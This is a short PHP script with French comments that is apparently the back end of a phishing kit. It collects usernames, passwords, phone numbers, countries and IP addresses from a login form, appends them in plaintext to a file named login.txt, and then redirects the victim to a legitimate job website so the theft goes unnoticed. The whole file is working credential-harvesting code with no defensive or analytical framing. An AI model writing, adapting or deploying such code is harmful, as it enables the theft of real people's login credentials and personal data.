<?php
// Vérifie si le formulaire a été soumis via la méthode POST
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    // Récupère et nettoie les données du formulaire
    $username = htmlspecialchars(trim($_POST["email"]));  // Adresse e-mail ou numéro de téléphone
    $password = htmlspecialchars(trim($_POST["password"]));  // Mot de passe
    $phone = htmlspecialchars(trim($_POST["phone"]));  // Numéro de téléphone
    $country = htmlspecialchars(trim($_POST["country"]));  // Pays
    
    // Récupère l'adresse IP du client
    $ip = $_SERVER['REMOTE_ADDR'];
    
    // Vérifie si les champs ne sont pas vides
    if (!empty($username) && !empty($password)) {
        // Formate les données pour l'enregistrement
        $data = "Username: " . $username . "\n";
        $data .= "Password: " . $password . "\n";
        $data .= "Phone: " . $phone . "\n";
        $data .= "Country: " . $country . "\n";
        $data .= "IP: " . $ip . "\n";
        $data .= "------------------------\n";

        // Tente d'enregistrer les données dans le fichier 'login.txt'
        $file = "login.txt";
        if (file_put_contents($file, $data, FILE_APPEND)) {
            // Si l'enregistrement réussit, redirige l'utilisateur
            header("Location: https://www.emploi.cd/");
            exit();
        } else {
            // Message en cas d'erreur d'écriture
            echo "Erreur : Impossible d'enregistrer les données.";
        }
    } else {
        // Message si les champs sont vides
        echo "Erreur : Veuillez remplir tous les champs.";
    }
} else {
    // Message si le formulaire n'a pas été soumis
    echo "Aucune donnée reçue.";
}
?
